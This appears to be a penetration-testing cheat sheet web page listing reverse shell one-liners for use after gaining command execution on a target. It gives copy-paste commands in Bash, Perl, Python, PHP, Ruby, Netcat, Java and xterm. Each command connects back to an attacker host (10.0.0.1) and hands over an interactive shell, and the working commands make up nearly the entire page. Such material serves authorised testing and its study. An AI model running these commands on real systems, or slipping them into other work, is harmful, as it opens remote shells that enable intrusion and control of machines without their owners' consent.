<p>If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>

<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>

<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>

<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>

<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>

<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>

<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>